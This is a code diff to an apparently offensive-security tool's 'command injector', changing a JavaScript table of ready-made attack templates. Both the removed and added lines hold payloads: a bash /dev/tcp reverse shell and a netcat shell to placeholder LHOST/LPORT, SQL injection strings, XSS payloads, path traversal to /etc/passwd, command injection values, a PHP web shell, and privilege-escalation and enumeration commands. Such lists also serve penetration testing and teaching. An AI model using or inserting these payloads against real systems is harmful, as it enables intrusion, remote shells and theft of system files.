@@ -2785,14 +2785,14 @@ MASTER_TEMPLATE = """
         // ==================== COMMAND INJECTOR FUNCTIONS ====================
         
         const INJECTION_TEMPLATES = {
-            revshell: "# Bash Reverse Shell" + String.fromCharCode(10) + "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" + String.fromCharCode(10) + String.fromCharCode(10) + "# Netcat Reverse Shell" + String.fromCharCode(10) + "nc LHOST LPORT -e /bin/sh",
-            sqli: "-- SQL Injection" + String.fromCharCode(10) + "' OR '1'='1" + String.fromCharCode(10) + "' OR '1'='1' --" + String.fromCharCode(10) + "' UNION SELECT NULL--",
-            xss: "<script>alert('XSS')</script>" + String.fromCharCode(10) + "<img src=x onerror=alert('XSS')>" + String.fromCharCode(10) + "<svg onload=alert('XSS')>",
-            lfi: "../../../etc/passwd" + String.fromCharCode(10) + "/proc/self/environ" + String.fromCharCode(10) + "php://filter/convert.base64-encode/resource=index.php",
-            rce: "; id" + String.fromCharCode(10) + "| id" + String.fromCharCode(10) + "$(id)" + String.fromCharCode(10) + "; cat /etc/passwd",
-            webshell: "<?php system($_GET['cmd']); ?>",
-            privesc: "whoami && id" + String.fromCharCode(10) + "sudo -l" + String.fromCharCode(10) + "find / -perm -4000 2>/dev/null",
-            enumeration: "hostname && whoami && id" + String.fromCharCode(10) + "uname -a" + String.fromCharCode(10) + "ip a" + String.fromCharCode(10) + "ps aux"
+            revshell: "bash -i >& /dev/tcp/LHOST/LPORT 0>&1",
+            sqli: "' OR '1'='1' --",
+            xss: "alert('XSS')",
+            lfi: "../../../etc/passwd",
+            rce: "; id",
+            webshell: "system(cmd);",
+            privesc: "sudo -l",
+            enumeration: "whoami && id"
         };
         
         function loadTemplate(type) {
